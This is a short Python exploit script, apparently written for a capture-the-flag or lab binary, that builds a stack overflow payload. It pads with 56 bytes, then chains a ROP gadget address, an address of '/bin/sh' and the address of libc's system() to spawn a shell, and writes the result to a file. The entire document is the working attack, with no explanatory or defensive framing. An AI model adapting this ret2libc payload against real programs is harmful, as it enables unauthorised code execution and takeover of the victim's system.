#!/usr/bin/python
#by: sayseven :D
import struct

buf = ""
buf += "A"*56
buf += struct.pack("<Q", 0x00000000004011fb) #ROPgatget
buf += struct.pack("<Q", 0x7ffff7f5b519) # bin/sh
buf += struct.pack("<Q", 0x7ffff7e1e9c0) #system 


f = open("payload", "w")
f.write(buf)
